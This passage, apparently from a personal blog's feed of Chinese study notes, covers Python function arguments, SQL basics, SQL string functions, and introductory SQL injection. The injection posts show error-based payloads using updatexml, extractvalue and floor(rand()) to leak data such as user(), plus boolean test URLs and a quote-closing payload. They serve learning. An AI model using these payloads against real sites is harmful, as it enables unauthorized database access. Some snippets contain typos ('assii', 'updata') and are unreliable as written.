class="line"></span><br></pre></td></tr></table></figure><h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><p>例如一个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parrot</span>(<span class="params">voltage, state=<span class="string">&#x27;a stiff&#x27;</span>, action=<span class="string">&#x27;voom&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;Norwegian Blue&#x27;</span></span>):</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接受一个必选参数 (<code>voltage</code>) 以及三个可选参数 (<code>state</code>, <code>action</code>, 和 <code>type</code>)。可以用以下的任一方法调用:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">parrot(<span class="number">1000</span>)                                          </span><br><span class="line"><span class="comment"># 1 positional argument</span></span><br><span class="line">parrot(voltage=<span class="number">1000</span>)                                  </span><br><span class="line"><span class="comment"># 1 keyword argument</span></span><br><span class="line">parrot(voltage=<span class="number">1000000</span>, action=<span class="string">&#x27;VOOOOOM&#x27;</span>)             </span><br><span class="line"><span class="comment"># 2 keyword arguments</span></span><br><span class="line">parrot(action=<span class="string">&#x27;VOOOOOM&#x27;</span>, voltage=<span class="number">1000000</span>)             </span><br><span class="line"><span class="comment"># 2 keyword arguments</span></span><br><span class="line">parrot(<span class="string">&#x27;a million&#x27;</span>, <span class="string">&#x27;bereft of life&#x27;</span>, <span class="string">&#x27;jump&#x27;</span>)         </span><br><span class="line"><span class="comment"># 3 positional arguments</span></span><br><span class="line">parrot(<span class="string">&#x27;a thousand&#x27;</span>, state=<span class="string">&#x27;pushing up the daisies&#x27;</span>)  </span><br><span class="line"><span class="comment"># 1 positional, 1 keyword</span></span><br></pre></td></tr></table></figure><p>以下几种调用是无效的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">parrot()                     </span><br><span class="line"><span class="comment"># required argument missing</span></span><br><span class="line">parrot(voltage=<span class="number">5.0</span>, <span class="string">&#x27;dead&#x27;</span>)  </span><br><span class="line"><span class="comment"># non-keyword argument after a keyword argument</span></span><br><span class="line">parrot(<span class="number">110</span>, voltage=<span class="number">220</span>)     </span><br><span class="line"><span class="comment"># duplicate value for the same argument</span></span><br><span class="line">parrot(actor=<span class="string">&#x27;John Cleese&#x27;</span>)  </span><br><span class="line"><span class="comment"># unknown keyword argument</span></span><br></pre></td></tr></table></figure><h4 id="Lambda形式"><a href="#Lambda形式" class="headerlink" title="Lambda形式"></a>Lambda形式</h4><p>出于实际需要，有几种通常在函数式编程语言例如 Lisp 中出现的功能加入到了 Python。通过 <a class="link"   href="https://docs.python.org/3/reference/expressions.html#lambda" >lambda<i class="fas fa-external-link-alt"></i></a> 关键字，可以创建短小的匿名函数。这里有一个函数返回它的两个参数的和： <code>lambda a, b: a+b</code>。 Lambda 形式可以用于任何需要的函数对象。出于语法限制，它们只能有一个单独的表达式。语义上讲，它们只是普通函数定义中的一个语法技巧。类似于嵌套函数定义，lambda 形式可以从外部作用域引用变量:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_incrementor</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: x + n</span><br><span class="line"></span><br><span class="line">f = make_incrementor(<span class="number">42</span>)</span><br><span class="line">f(<span class="number">0</span>) <span class="comment"># 42</span></span><br><span class="line">f(<span class="number">1</span>) <span class="comment"># 43</span></span><br></pre></td></tr></table></figure><p>上面的示例使用 lambda 表达式返回一个函数。</p><h4 id="文档字符串"><a href="#文档字符串" class="headerlink" title="文档字符串"></a>文档字符串</h4><p>第一行应该是关于对象用途的简介，如果文档字符串有多行，第二行应该空出来，与接下来的详细描述明确分隔。接下来的文档应该有一或多段描述对象的调用约定、边界效应等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_function</span>():</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Do nothing, but document it.</span></span><br><span class="line"><span class="string">     </span></span><br><span class="line"><span class="string"> No, really, it doesn&#x27;t do anything.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="函数注解"><a href="#函数注解" class="headerlink" title="函数注解"></a>函数注解</h4><p>注解是以字典形式存储在函数的 <code>__annotations__</code> 属性中，对函数的其它部分没有任何影响。参数注解（Parameter annotations）是定义在参数名称的冒号后面，紧随着一个用来表示注解的值得表达式。返回注释（Return annotations）是定义在一个 <code>-&gt;</code> 后面，紧随着一个表达式，在冒号与 <code>-&gt;</code> 之间。下面的示例包含一个位置参数，一个关键字参数，和没有意义的返回值注释:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">ham: <span class="number">42</span>, eggs: <span class="built_in">int</span> = <span class="string">&#x27;spam&#x27;</span></span>) -&gt; &quot;Nothing to see here&quot;:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>Reference:<a class="link"   href="http://www.pythondoc.com/pythontutorial3/controlflow.html" >http://www.pythondoc.com/pythontutorial3/controlflow.html<i class="fas fa-external-link-alt"></i></a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python的流程控制&quot;&gt;&lt;a href=&quot;#Python的流程控制&quot; class=&quot;headerlink&quot; title=&quot;Python的流程控制&quot;&gt;&lt;/a&gt;Python的流程控制&lt;/h1&gt;&lt;p&gt;今天看了python的流程控制，复习一下。&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="Python学习笔记" scheme="http://jacen-cpu.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="python" scheme="http://jacen-cpu.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SQLMap入狱指南</title>
    <link href="http://jacen-cpu.github.io/2021/07/18/SQLMap%E5%85%A5%E7%8B%B1%E6%8C%87%E5%8D%97/"/>
    <id>http://jacen-cpu.github.io/2021/07/18/SQLMap%E5%85%A5%E7%8B%B1%E6%8C%87%E5%8D%97/</id>
    <published>2021-07-18T10:41:20.000Z</published>
    <updated>2021-07-18T10:41:20.079Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL函数</title>
    <link href="http://jacen-cpu.github.io/2021/07/18/SQL%E5%87%BD%E6%95%B0/"/>
    <id>http://jacen-cpu.github.io/2021/07/18/SQL%E5%87%BD%E6%95%B0/</id>
    <published>2021-07-18T09:13:26.000Z</published>
    <updated>2021-07-19T08:35:12.499Z</updated>
    
    <content type="html"><![CDATA[<h1 id="substr-str-pos-len"><a href="#substr-str-pos-len" class="headerlink" title="substr(str, pos, len)"></a>substr(str, pos, len)</h1><p>该函数功能是从pos开始的位置，截取len个字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">substr(string, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"># 取string左边第<span class="number">1</span>位置起，<span class="number">3</span>字长的字符串。</span><br><span class="line"># 所以结果为：str</span><br><span class="line">substr(string, <span class="number">-1</span>,<span class="number">3</span>)</span><br><span class="line"># 取string右边第<span class="number">1</span>位置起，<span class="number">3</span>字长的字符串。显然右边第一位置起往右不够<span class="number">3</span>字     长。结果只能是： g</span><br><span class="line">substr(string, <span class="number">-3</span>,<span class="number">3</span>)</span><br><span class="line"># 取string右边第<span class="number">3</span>位置起，<span class="number">3</span>字长的字符串。</span><br><span class="line"># 结果为: ing</span><br></pre></td></tr></table></figure><p>另外<code>substr(str, pos)</code>表示从pos位置开始截取到最后。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">substr(string, <span class="number">4</span>)</span><br><span class="line"># 从右第<span class="number">4</span>位置截取到最后</span><br><span class="line"># 结果是： ing</span><br></pre></td></tr></table></figure><h1 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h1><p>函数接受字符表达式并返回字符表达式最左侧字符的ASCII代码值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> assii(&quot;fx&quot;)</span><br><span class="line"># 结果是： <span class="number">102</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;substr-str-pos-len&quot;&gt;&lt;a href=&quot;#substr-str-pos-len&quot; class=&quot;headerlink&quot; title=&quot;substr(str, pos, len)&quot;&gt;&lt;/a&gt;substr(str, pos, len)&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="数据库" scheme="http://jacen-cpu.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="SQL" scheme="http://jacen-cpu.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>SQL报错注入</title>
    <link href="http://jacen-cpu.github.io/2021/07/15/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://jacen-cpu.github.io/2021/07/15/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-15T09:50:13.000Z</published>
    <updated>2021-07-18T01:39:16.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xpath报错注入"><a href="#xpath报错注入" class="headerlink" title="xpath报错注入"></a>xpath报错注入</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误</li></ul><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ul><li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li><li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li><li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li></ul><h2 id="报错实战-updatexml-（基于dvwa平台"><a href="#报错实战-updatexml-（基于dvwa平台" class="headerlink" title="报错实战 updatexml() （基于dvwa平台)"></a>报错实战 updatexml() （基于dvwa平台)</h2><h1 id="floor-函数报错注入"><a href="#floor-函数报错注入" class="headerlink" title="floor ()函数报错注入"></a>floor ()函数报错注入</h1><h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p>floor函数的作用就是返回小于等于括号内该值的最大整数。</p><h2 id="round"><a href="#round" class="headerlink" title="round()"></a>round()</h2><p>rand()可以产生一个在0和1之间的随机数。可以看出，直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。</p><h2 id="floor-rand-0-2-函数"><a href="#floor-rand-0-2-函数" class="headerlink" title="floor(rand(0)*2)函数"></a>floor(rand(0)*2)函数</h2><p>floor函数的作用就是返回小于等于括号内该值的最大整数。rand()本身是返回0<del>1的随机数，但在后面*2就变成了返回0</del>2之间的随机数。配合上floor函数就可以产生确定的两个数，即0和1。并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。此处的myclass 表为含有四行数据的表。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xpath报错注入&quot;&gt;&lt;a href=&quot;#xpath报错注入&quot; class=&quot;headerlink&quot; title=&quot;xpath报错注入&quot;&gt;&lt;/a&gt;xpath报错注入&lt;/h1&gt;&lt;h2 id=&quot;updatexml&quot;&gt;&lt;a href=&quot;#updatexml&quot; class</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入分类</title>
    <link href="http://jacen-cpu.github.io/2021/07/14/SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/"/>
    <id>http://jacen-cpu.github.io/2021/07/14/SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/</id>
    <published>2021-07-14T12:34:50.000Z</published>
    <updated>2021-07-14T13:59:22.649Z</updated>
    
    <content type="html"><![CDATA[<h1 id="注入漏洞分类"><a href="#注入漏洞分类" class="headerlink" title="注入漏洞分类"></a>注入漏洞分类</h1><p>常见的SQL注入类型主要包括：数字型和字符型。</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>当输入的参数为整型时，如果存在注入漏洞，则可认为是数字型注入，数字型注入是最简单的一种。</p><p>测试步骤：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://www.xxser.com/test.php?id=8&#x27;</span><br></pre></td></tr></table></figure><p>出现异常</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://www.xxser.com/test.php?id=8 and 1=1</span><br></pre></td></tr></table></figure><p>正常执行，结构相同</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP://www.xxser.com/test.php?id=8 and 1=2</span><br></pre></td></tr></table></figure><p>正常执行，结果有差异</p><p>如果以上三个步骤全部满足，则程序可能存在<code>SQL</code>注入</p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>当输入参数为字符串时，称为字符型。</p><p>字符型注入的关键是如何闭合<code>SQL</code>语句以及注释多余的代码。</p><p>当查询内容为字符串时：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> usename <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>此时要想注入，就要：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> usename <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure><p>又比如<code>updata</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updata Person <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,<span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>现在对该<code>SQL</code> 语句进行注入就需要闭合单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updata Person <span class="keyword">set</span> username<span class="operator">=</span><span class="string">&#x27;username&#x27;</span>,<span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="operator">+</span>(<span class="keyword">select</span> @<span class="variable">@version</span>)<span class="operator">+</span><span class="string">&#x27;&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>利用两次单引号注释完成了注入。</p><blockquote><p>数据库不同其连接符也不同，SQL Server连接符号为”+”,Oracle连接符为”||”,MySQL连接符为空格、</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;注入漏洞分类&quot;&gt;&lt;a href=&quot;#注入漏洞分类&quot; class=&quot;headerlink&quot; title=&quot;注入漏洞分类&quot;&gt;&lt;/a&gt;注入漏洞分类&lt;/h1&gt;&lt;p&gt;常见的SQL注入类型主要包括：数字型和字符型。&lt;/p&gt;
&lt;h2 id=&quot;数字型注入&quot;&gt;&lt;a href=&quot;#数</summary>
      
    
    
    
    <category term="web" scheme="http://jacen-cpu.github.io/categories/web/"/>
    
    
    <category term="SQL注入" scheme="http://jacen-cpu.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL_language</title>
    <link href="http://jacen-cpu.github.io/2021/07/14/SQL-language/"/>
    <id>http://jacen-cpu.github.io/2021/07/14/SQL-language/</id>
    <published>2021-07-14T02:10:52.000Z</published>
    <updated>2021-07-15T10:27:13.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库的分类"><a href="#数据库的分类" class="headerlink" title="数据库的分类"></a>数据库的分类</h1><h2 id="关系型"><a href="#关系型" class="headerlink" title="关系型"></a>关系型</h2><p>它可以砍成一个二位矩阵，通过行和列可以确定每一个数据，类似Excel。</p><p>基于关系数据库的数据库软件有很多，目前主流的数据库主要有以下几类：</p><blockquote><ol><li>商用数据库：Oracle，SQL Server，DB2等。</li><li>开源数据库：MySQL，PostgreSQL等。</li><li>桌面数据库：Microsoft Access等。</li><li>嵌入式数据库 ：Sqlite等。</li></ol></blockquote><h2 id="非关系型-NOSQL"><a href="#非关系型-NOSQL" class="headerlink" title="非关系型(NOSQL)"></a>非关系型(NOSQL)</h2><p>​        在非关系数据库中，数据的定义没有关系数据库中的限制，数据的定义可以非常灵活，在如今这个数据爆炸的时代，NoSQL非常适用于那些数据关系不复杂，并且对数据的规模和扩展性有需求的场景。</p><blockquote><p>Mongodb, DynamoDB</p></blockquote><h1 id="SQL-Structured-Query-Language"><a href="#SQL-Structured-Query-Language" class="headerlink" title="SQL(Structured Query Language)"></a>SQL(Structured Query Language)</h1><p>SQL语言定义以下几种操作数据库的功能：</p><blockquote><ul><li>DDL(Data Definition Language)：允许用户定义数据（创建表、删除表、修改表）。</li><li>DML(Data Manipulation Language)：添加、删除、更新数据。</li><li>DQL(Data Query Language)：查询数据，也是最频繁的数据库日常操作。</li></ul></blockquote><h1 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h1><p>关系数据库是建立在关系模型上的，而关系模型本质上就是由多个存储数据的二维表组成的。表的每一行叫做记录（ Record），记录是一个逻辑意义上的数据。表的每一列称为字段（Column），同一张表中每一列的数据类型都是一致的。字段包含的数据类型包括整形、浮点型、字符串、日期等等，以及是否允许为空（Null）。</p><p>关系数据库的表和表之间的逻辑关系有三种：“一对多”、“多对一”和“一对一”。</p><h2 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h2><p>关系表中有个很重要的约束，就是任意两条记录不能重复。这里的不能重复指的是每条记录需要一个能和其他记录区别开来的特定字段，这个字段称为<strong>主键</strong>。</p><p>常见的可作为id字段的类型有：</p><blockquote><ol><li>自增整数类型：数据库会在插入数据后自动为每条记录分配一个自增整数，这样我们就不用担心主键重复，也不用自己预先生成主键。</li><li>全局唯一GUID类型：这是一种全局唯一的字符串，类似8f55d96b-8acc-4636-8cb8-76bf8abc2f57。GUID算法通过网卡MAC地址、时间戳和随机数生成在任意时间都不同的字符串，大部分编程语言内置了GUID算法，可以自动生成主键。</li></ol></blockquote><h3 id="联合主键"><a href="#联合主键" class="headerlink" title="联合主键"></a>联合主键</h3><p>关系数据库也允许表通过多个字段来定位记录，既使用两个或多个字段作为主键，这种主键叫做联合主键。对于联合主键，允许一列有重复，但是所有主键的组合必须是唯一的</p><h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><p>通过另一个表的主键联合两张表的字段就称之为外键。要注意的是，外键必须是另一个表格的主键。</p><h1 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h1><h2 id="表格（创建，修改，删除）"><a href="#表格（创建，修改，删除）" class="headerlink" title="表格（创建，修改，删除）"></a>表格（创建，修改，删除）</h2><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><p><code>CREATE TABLE</code>是创建表格的语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 datatype1,</span><br><span class="line">    column2 datatype2,</span><br><span class="line">    column3 datatype3,</span><br><span class="line">   ....</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Students (</span><br><span class="line">    StudentID <span class="type">int</span>, </span><br><span class="line">    Name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    City <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY(StudentID)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>特定数据库支持的数据类型不同，以下是常用的<code>SQL</code>数据类型：</p><table><thead><tr><th>数据类型</th><th>描述</th></tr></thead><tbody><tr><td>VARCHAR(n) 或 CHARACTER VARYING(n)</td><td>可变长度的字符/字符串，最大长度为n</td></tr><tr><td>BINARY(n)</td><td>固定长度为n的二进制串</td></tr><tr><td>BOOLEAN</td><td>存储TRUE或FALSE值</td></tr><tr><td>INTEGER(p)</td><td>整数值（没有小数点），精度为p</td></tr><tr><td>INTEGER</td><td>整数值（没有小数点），精度为10</td></tr><tr><td>DECIMAL(p, s)</td><td>精确数值，精度为p，小数点后位数为s。例如：DICIMAL(5,2)小数点前有3位数，小数点后有2位数</td></tr><tr><td>FLOAT(p)</td><td>近似数值，尾数精度为p</td></tr><tr><td>FLOAT</td><td>近似数值，尾数精度为16</td></tr><tr><td>DATE</td><td>存储年、月、日的值</td></tr><tr><td>TIMESTAMP</td><td>存储年、月、日、小时、分、秒的值</td></tr></tbody></table><h3 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h3><p>如果我们想添加、删除、或者修改表中的特定字段，可以使用ALTER TABLE语句。添加字段语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name </span><br><span class="line"><span class="keyword">ADD</span> column_name datatype;</span><br></pre></td></tr></table></figure><p>如果想要删除字段，使用<code>ALTER TABLE table_name DROP COLUMN column_name;</code>语句即可，以下语句就将<code>Students</code>中的<code>Age</code>字段删除了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students </span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> Age;</span><br></pre></td></tr></table></figure><p>修改字段设定的语句是：<code>ALTER TABLE table_name MODIFY COLUMN column_name data_type</code>; 以下语句将<code>Students</code>中<code>Name</code>的数据类型改为<code>varchar(200)</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Students </span><br><span class="line">MODIFY <span class="keyword">COLUMN</span> Name <span class="type">varchar</span>(<span class="number">200</span>);</span><br></pre></td></tr></table></figure><h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><p>如果要删除表格，使用<code>DROP TABLE</code>语句即可：<code>DROP TABLE table_name</code>；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> Students;</span><br></pre></td></tr></table></figure><h2 id="操作记录（增加，删除，修改，替换）"><a href="#操作记录（增加，删除，修改，替换）" class="headerlink" title="操作记录（增加，删除，修改，替换）"></a>操作记录（增加，删除，修改，替换）</h2><p>关系数据库的基本操作是增删差改，既<code>CRUD：Create, Retrieve, Update, Delete</code>。</p><h3 id="插入记录"><a href="#插入记录" class="headerlink" title="插入记录"></a>插入记录</h3><p><code>INSERT INTO</code> 语句用于在表中插入新记录，插入的方法有两张，第一种语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name(column1, column2, column3, ...) <span class="keyword">VALUES</span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure><p>第二种方法不需要指定<code>column</code>，只需要插入数据，但是要保证数据的顺序和数量和字段是对应的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name <span class="keyword">VALUES</span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure><h3 id="修改记录"><a href="#修改记录" class="headerlink" title="修改记录"></a>修改记录</h3><p><code>UPDATE</code> 语句可以用来修改表中的记录，语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>其中WHERE限定了你要更新的记录，关于<code>condtion</code>的内容会在之后学习查询时详细探讨，现在简单理解就好。如果不使用WHERE子句，那么所有的记录都会被更新。以下语句将<code>StudentID</code>为1的学生改名为‘Daniel’：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Students</span><br><span class="line"><span class="keyword">SET</span> Name <span class="operator">=</span> <span class="string">&#x27;Daniel&#x27;</span> </span><br><span class="line"><span class="keyword">WHERE</span> StudentID <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h3><p>如果要删除已有的记录，我们可以使用<code>DELETE</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>替换的意思就是：如果我们希望插入一条新纪录，但是如果此记录已经存在，就先删除原记录，再插入新纪录。此时，我们就能使用<code>REPLACE</code>语句，这样就不需要通过查询，再决定是否先删除再插入了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE <span class="keyword">INTO</span> Students(StudentID, name, city) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Enoch&#x27;</span>, <span class="string">&#x27;New York City&#x27;</span>);</span><br></pre></td></tr></table></figure><p>此语句的作用就是查询id为1的学生记录是否存在，如果不存在，就创建一个新的记录，否则，已有记录会被删除，然后新纪录再被插入。</p><h2 id="约束"><a href="#约束" class="headerlink" 